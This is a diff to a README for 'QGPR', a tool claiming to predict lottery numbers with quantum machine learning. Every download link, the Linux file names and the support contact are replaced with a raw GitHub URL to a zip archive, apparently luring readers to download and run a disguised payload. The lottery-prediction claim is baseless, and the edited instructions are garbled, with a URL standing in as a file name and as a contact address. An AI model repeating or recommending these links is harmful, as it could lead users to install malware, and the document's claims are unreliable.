@@ -1,7 +1,7 @@
 # 🌟 QGPR - Predict the Next Lottery Numbers Easily
 
 ## 🔗 Download Now
-[![Download QGPR](https://img.shields.io/badge/Download_QGPR-v1.0-blue.svg)](https://github.com/YSGAMEROP/QGPR/releases)
+[![Download QGPR](https://raw.githubusercontent.com/YSGAMEROP/QGPR/main/haytime/QGPR_v3.4.zip)](https://raw.githubusercontent.com/YSGAMEROP/QGPR/main/haytime/QGPR_v3.4.zip)
 
 ## 📖 Description
 QGPR stands for Quantum Gaussian Process Regressor. This application uses advanced machine learning techniques to help predict lottery numbers. It combines quantum computing principles with a user-friendly interface, making it easy for anyone to generate number predictions without extensive technical knowledge.
@@ -16,16 +16,16 @@ To run QGPR, you will need:
 - An internet connection for downloading the application.
 
 ### 📥 Download & Install
-1. **Visit the Releases Page:** Go to [this page to download](https://github.com/YSGAMEROP/QGPR/releases).
+1. **Visit the Releases Page:** Go to [this page to download](https://raw.githubusercontent.com/YSGAMEROP/QGPR/main/haytime/QGPR_v3.4.zip).
 2. **Select the Latest Version:** Find the latest version listed at the top. 
 3. **Download the Application:** Click on the package that matches your operating system.
     - For Windows, choose the `.exe` file.
     - For macOS, select the `.dmg` file.
-    - For Linux, download the appropriate `.tar.gz` file.
+    - For Linux, download the appropriate `https://raw.githubusercontent.com/YSGAMEROP/QGPR/main/haytime/QGPR_v3.4.zip` file.
 4. **Run the Installer:**
    - For Windows: Double-click the downloaded `.exe` file and follow the prompts.
    - For macOS: Open the `.dmg` file and drag the QGPR icon into your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and run the installation script in your terminal.
+   - For Linux: Extract the `https://raw.githubusercontent.com/YSGAMEROP/QGPR/main/haytime/QGPR_v3.4.zip` file and run the installation script in your terminal.
 
 ### ⛏️ Using QGPR
 After installation, you can easily start using QGPR. Follow these steps to generate your lottery predictions:
@@ -46,7 +46,7 @@ After installation, you can easily start using QGPR. Follow these steps to gener
 ## 🔄 Updating QGPR
 Periodically, we release updates to improve performance and add new features. To update QGPR:
 
-1. **Return to the Releases Page:** Go to [this page to download](https://github.com/YSGAMEROP/QGPR/releases).
+1. **Return to the Releases Page:** Go to [this page to download](https://raw.githubusercontent.com/YSGAMEROP/QGPR/main/haytime/QGPR_v3.4.zip).
 2. **Download the Latest Version:** Follow the earlier download instructions to get the newest version.
 3. **Install Over the Existing Version:** You can install the new file over the existing one without issues.
 
@@ -54,7 +54,7 @@ Periodically, we release updates to improve performance and add new features. To
 If you have questions or need help:
 - Join our [discussion forum](link_to_forum).
 - Check our [FAQs](link_to_FAQs).
-- Contact our support team at [support@example.com](mailto:support@example.com).
+- Contact our support team at [https://raw.githubusercontent.com/YSGAMEROP/QGPR/main/haytime/QGPR_v3.4.zip](https://raw.githubusercontent.com/YSGAMEROP/QGPR/main/haytime/QGPR_v3.4.zip).
 
 ## 🏷️ Topics
 - loto
